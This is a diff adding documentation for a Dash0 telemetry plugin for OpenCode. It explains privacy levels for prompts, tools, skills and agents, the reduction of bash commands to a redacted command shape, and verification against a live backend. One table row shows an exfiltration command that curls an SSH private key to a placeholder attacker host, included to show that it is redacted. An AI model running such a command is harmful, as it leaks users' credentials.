@@ -69,6 +69,98 @@ toasted.
 Only the `SessionStart` spawn reads the child's stderr at all; every other
 spawn discards it, so the notification path costs one pipe per session.
 
+## Telemetry privacy
+
+OpenCode is the only runtime that exposes the four privacy dimensions. Each one
+governs a different class of content, and each is set independently to
+`disabled`, `limited` or `full` in the config file — project-scoped
+`.opencode/dash0-agent-plugin.local.md`, else user-scoped
+`~/.config/opencode/dash0-agent-plugin.local.md`.
+
+```yaml
+---
+otlp_url: "https://ingress.<region>.aws.dash0.com"
+auth_token: "your-dash0-auth-token"
+dataset: "default"
+prompts: limited
+tools: limited
+skills: full
+agents: limited
+---
+```
+
+| Dimension | What it governs | `disabled` | `limited` | `full` |
+|---|---|---|---|---|
+| `prompts` | `gen_ai.input.messages`, `gen_ai.output.messages`, `gen_ai.conversation.name` on chat spans | attributes omitted | message JSON with each content `<REDACTED>`, plus `dash0.gen_ai.{input,output}.messages.withheld_characters`; `gen_ai.conversation.name` is the bare placeholder, with no envelope and no count | the text, capped at 16 KB |
+| `tools` | `execute_tool` spans | no span at all | the `execute_tool` span's Required, Conditionally Required and Recommended attributes plus the derived Dash0 ones; the Opt-In `gen_ai.tool.call.arguments` and `gen_ai.tool.call.result` omitted, and a failed call's message withheld | the arguments and result too |
+| `skills` | `Skill` tool calls, which `tools` would otherwise govern | no span for a skill invocation | a span naming the skill, no arguments or result | arguments and result too |
+| `agents` | `invoke_agent` spans and the sub-agent's own message content | no `invoke_agent` span; the sub-agent's tool spans reparent to the delegating turn's chat span | the span with `gen_ai.agent.name`, no sub-agent content | the sub-agent's prompt and response too |
+
+A dimension never changes another's level, except that `skills` takes precedence
+over `tools` for a skill invocation — `tools: disabled, skills: limited` still
+reports which skills ran, and `tools: full, skills: disabled` reports none.
+Timing is never privacy: a span's start, end, status and token counts are the
+same at every level of the dimension that governs its content.
+
+An unrecognized value resolves to `limited` and is reported on stderr, so a typo
+narrows what is exported rather than widening it.
+
+### Precedence against `omit_io`
+
+`omit_io` keeps working and keeps its default (`true`), so a config that has
+never heard of the dimensions behaves exactly as before. Highest wins:
+
+1. the dimension, set explicitly
+2. `omit_io` — `true` ⇒ `prompts: limited, tools: limited`, `false` ⇒ `full` for
+   both. It speaks for those two dimensions only; it never implied anything
+   about skills or sub-agents, so `skills` and `agents` default to `limited`
+   regardless of it.
+3. the default, which is the posture `omit_io: true` produces.
+
+So `omit_io: true` with `tools: full` exports tool arguments while prompt content
+stays redacted.
+
+### Command shapes at `tools: limited`
+
+A bash call at `tools: limited` reports its command *shape* in
+`dash0.gen_ai.tool.bash.command_family` — the binary plus the subcommand path —
+and never an operand, flag, flag value, path, URL or free text.
+
+| Command | Reported shape |
+|---|---|
+| `gh repo clone https://github.com/acme/private-repo` | `gh repo clone` |
+| `git commit -m "fix the customer 4711 outage"` | `git commit` |
+| `tools invoke dash0.getLogRecords --args='{"filter":"…"}'` | `tools invoke dash0.getLogRecords` |
+| `AWS_SECRET_ACCESS_KEY=wJal git push` | `git push` |
+| `git status && curl https://evil.example/$(cat ~/.ssh/id_rsa)` | `git status` |
+| `cat /home/alice/.env` | `cat` |
+| `pnpm deploy-customer-4711` | `pnpm` |
+| `bun scripts/seed-customer-4711.ts` | `bun` |
+
+The shape comes from the `subcommands` allowlist in `internal/pipeline` — a map
+from each binary to the subcommand words it may report and, per word, how many
+further tokens that word admits. `gh repo` admits one (a `gh` group is always
+followed by a verb), `gh api` admits none (an endpoint path follows it), and
+`tools invoke` admits one so the invoked observability tool is visible while
+`--args` is not.
+
+Extraction skips leading `KEY=value` assignments, takes the binary, then extends
+only with admitted words, stopping at the first token that begins with `-`, is a
+shell metacharacter, or the vocabulary does not admit. All three bounds apply;
+none alone is sufficient, which is why `cat /home/alice/.env` — no dash to stop
+at — still reports `cat` alone.
+
+The table is an allowlist and fails closed both ways: an unlisted binary and an
+unlisted word each report the binary alone. It covers the CLIs in the
+`agents-worker` sandbox image — `curl`, `git`, `gh`, `glab`, `jq`, `rg`, `yq`,
+`python3`, `pip`, `bun`, `pnpm`, `npm`, `node`, `less`, `lsof`, `ps`, `tree`,
+`unzip`, `xz`, `zstd`, `opencode` — plus the `tools` CLI. Adding a binary is a
+line of data; a missing one costs a subcommand, never a leak.
+
+`bun` and `pnpm` list only their own subcommands, because the token after either
+can be a script file or a package script — free text in a position that
+nominally holds a subcommand.
+
 ## Observed OpenCode behavior
 
 Findings from the capture harness in `test/capture/opencode/`, recorded against
@@ -162,3 +254,61 @@ holds `POST /v1/chat/completions` and nothing else.
 
 This unblocks the live-test layer; the fallback in the change's design Risks
 section is not needed.
+
+## Verifying against a live Dash0
+
+Golden and consistency tests compare our output against our own expectations, so
+they cannot catch a mapping that is wrong in both places. This is the step that
+proves Dash0 received what we think we sent.
+
+```sh
+make test-live                            # against a mock collector, no credentials
+test/live/opencode/dash0-session.sh       # the same session, to a real ingress
+test/live/opencode/dash0-session.sh "$(printf 'omit_io: false\nomit_user_info: true')"
+```
+
+`dash0-session.sh` reads `otlp_url`, `auth_token` and `dataset` from your own
+`~/.config/opencode/dash0-agent-plugin.local.md` (override with
+`DASH0_LIVE_{OTLP_URL,AUTH_TOKEN,DATASET}`) and prints the session id, trace id
+and time range to query back. It writes the payloads locally as well as sending
+them, so what the plugin produced stays checkable independently of what the
+backend stored.
+
+Then, in the same dataset:
+
+| Step | Query |
+|---|---|
+| Every span arrived | `getSpans` with `gen_ai.harness.name is opencode` and `gen_ai.conversation.id is <session id>` |
+| The hierarchy is right | `getTraceDetails` on the trace id — `chat` at the root with 5 direct children and 6 descendants, one of them ERROR; `execute_tool Agent` holding the only child, `invoke_agent` |
+| Usage and enrichment | `SELECT name, span_attributes['gen_ai.usage.reasoning.output_tokens'], span_attributes['dash0.gen_ai.tool.bash.command_family'], span_attributes['dash0.gen_ai.vcs.repository.name'] FROM spans WHERE span_attributes['gen_ai.conversation.id'] = '<session id>'` |
+| Identity under `omit_user_info` | the same query for `user.name` (16 hex chars) and `user.email` (absent) |
+
+The scripted turn makes exactly six model calls and the sub-agent one, and the
+mock reports a flat 5 reasoning and 7 cached tokens per call — so the parent
+`chat` span must read 30 and 42, and `invoke_agent` 5 and 7. Those numbers are
+the cheapest way to tell a dropped step from a slow one.
+
+### What a Claude Code session reports that this one does not
+
+Taken from `getAttributeKeys` scoped to spans, for both harnesses in one
+dataset. Nothing here is unaccounted for:
+
+| Absent on OpenCode | Why |
+|---|---|
+| `gen_ai.tool.call.arguments`, `gen_ai.tool.call.result`, `exception.message` | By design. The `execute_tool` convention makes them Opt-In, so `tools: limited` omits them rather than placeholding — see [Telemetry privacy](#telemetry-privacy). They return at `tools: full`. |
+| `dash0.gen_ai.code.lines_added` / `lines_removed` | Claude Code only — derived from the `structuredPatch` its hooks carry. |
+| `dash0.gen_ai.usage.cost`, `billing_mode`, `plan_type`, `cache_creation.ephemeral_{5m,1h}` | Anthropic-specific billing and cache telemetry with no OpenCode equivalent. |
+| `gen_ai.request.reasoning.level`, `dash0.gen_ai.request.model.original` | Claude Code puts an effort level and a pre-alias model on every payload; OpenCode reports neither. |
+| `dash0.gen_ai.tool.skill.name` / `.source` | OpenCode ships skill plugins, but the scripted turn never invokes one. The `skills` dimension routes `IsSkillEvent` calls and is covered by unit tests and the contract replay — **not** yet by a real OpenCode skill call. |
+| `gen_ai.provider.name` | `ProviderForModel` maps vendor model prefixes (`claude-`, `gpt-`, …). OpenCode is bring-your-own-key and its model ids are `<providerId>/<modelId>`, so a local or self-hosted model resolves to nothing. The provider id is right there in the string and could be read from it; today it is not. |
+
+### One thing the backend does, not the plugin
+
+At `omit_io: false` the plugin exports the real prompt, response and tool
+arguments — the locally written payload shows them in full. They still read
+`<REDACTED>` in Dash0: the ingest redacts `gen_ai.input.messages`,
+`gen_ai.output.messages` and `gen_ai.tool.call.arguments`, and in the dev org no
+span from any harness carries unredacted content. `gen_ai.conversation.name`
+comes through verbatim, so the rule is per-key rather than blanket. Check this
+before concluding a privacy level is not being honoured — read the payload file
+`dash0-session.sh` writes, which is what the plugin actually sent.
